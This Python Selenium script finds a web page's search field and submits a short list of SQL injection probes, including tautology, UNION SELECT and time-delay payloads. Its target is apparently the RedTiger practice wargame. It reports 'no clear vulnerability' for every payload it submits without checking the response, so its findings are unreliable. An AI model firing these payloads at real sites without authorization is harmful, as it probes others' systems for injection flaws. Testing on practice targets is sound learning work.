from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException, ElementNotInteractableException, \
    StaleElementReferenceException
import time


def find_search_bar(browser, url):
    browser.get(url)
    try_methods = [
        ("css_selector", "input[type='text']"),
        ("name", "q"),
        ("id", "search-bar"),
        ("css_selector", "input[type='search']")
    ]

    # Attempt to find and verify search bar in main content
    found_search_bar = try_methods_for_search_bar(browser, try_methods)
    if found_search_bar:
        return found_search_bar

    # Fallback: attempt to find and verify search bar within frames
    browser.switch_to.default_content()  # Ensure starting from the main document
    frames = browser.find_elements(By.TAG_NAME, "iframe") + browser.find_elements(By.TAG_NAME, "frame")

    for frame in frames:
        try:
            browser.switch_to.frame(frame)
            found_search_bar = try_methods_for_search_bar(browser, try_methods)
            if found_search_bar:
                return found_search_bar
        except Exception as e:
            print(f"Error switching to frame: {e}")
        finally:
            browser.switch_to.default_content()  # Always switch back to the main content after each frame

    print("Search bar not found in any frame or the main content.")
    return None


def try_methods_for_search_bar(browser, try_methods):
    for method, value in try_methods:
        search_bar = try_find_search_bar(browser, method, value)
        if search_bar:
            return search_bar
    return None


def try_find_search_bar(browser, method, value):
    try:
        search_bar = WebDriverWait(browser, 15).until(
            EC.presence_of_element_located((getattr(By, method.upper()), value))
        )
        # Attempt to interact with the search bar to ensure it's interactable
        try:
            search_bar.send_keys("Test")
            search_bar.clear()  # Clear the text to leave the search bar as it was
            print(f"Found interactable search bar using {method}='{value}'.")
            return search_bar
        except (ElementNotInteractableException):
            print(f"Search bar found but not interactable using {method}='{value}'.")
            return None
    except (NoSuchElementException, TimeoutException) as e:
        print(f"Search bar not found using {method}='{value}'. Reason: {e}")
        return None


def test_sqli_payloads(browser, find_search_bar_function, url):
    payloads = [
        "'",
        "1' OR '1'='1",
        "' UNION SELECT 1,2,3,4-- -",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=(SELECT COUNT(*) FROM tablenames); --"
    ]
    results = []
    exceptions = []

    for payload in payloads:
        try:
            search_bar = find_search_bar_function(browser, url)
            if search_bar is None:
                raise Exception("Search bar could not be found after navigating back.")

            search_bar.clear()
            search_bar.send_keys(payload)
            search_bar.send_keys(Keys.ENTER)
            time.sleep(5)  # Adjust based on the expected response time

            results.append((payload, "Tested, no clear vulnerability detected."))

            browser.back()
            time.sleep(2)  # Give some time for the page to go back, adjust this value as needed
        except Exception as e:
            exceptions.append((payload, str(e)))

    for payload, exception_message in exceptions:
        print(f"Payload '{payload}': Exception - {exception_message}")
    return results


def check_sqli_in_searchbar():
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--ignore-certificate-errors")
    browser = webdriver.Chrome(options=chrome_options)

    url = "https://redtiger.labs.overthewire.org/level2.php"

    try:
        search_bar = find_search_bar(browser, url)
        if search_bar:
            print("Success: Search bar found.")
            results = test_sqli_payloads(browser, find_search_bar, url)
            print("\nSQL Injection Test Results:")
            for payload, result in results:
                print(f"Payload '{payload}': {result}")
        else:
            print("Search bar not found.")
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")
    finally:
        browser.quit()


if __name__ == '__main__':
    check_sqli_in_searchbar()
